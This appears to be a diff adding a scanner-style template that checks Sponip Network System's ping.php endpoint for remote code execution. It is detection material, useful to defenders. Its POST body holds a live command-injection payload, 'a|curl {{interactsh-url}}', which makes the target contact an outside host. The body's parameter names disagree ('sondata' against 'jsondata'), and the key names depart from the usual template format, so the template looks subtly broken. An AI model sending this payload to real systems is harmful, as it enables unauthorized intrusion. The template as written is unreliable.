@@ -1,0 +1,30 @@
+id: sponip-network-system-ping-rce
+brief:
+    title: Sponip Network System Ping - Remote Code Execution
+    by: pikpikcu
+    level: critical
+    about: Sponip Network System Ping is susceptible to remote code execution.
+    label:
+        - sponip
+        - rce
+        - oast
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/php/ping.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: sondata[ip]=a|curl {{interactsh-url}}&jsondata[type]=1
+      signs:
+        - "on": word
+          has:
+            - http
+          in: interactsh_protocol
+          need: all
+        - "on": word
+          has:
+            - 'User-Agent: curl'
+          in: interactsh_request
+          need: all
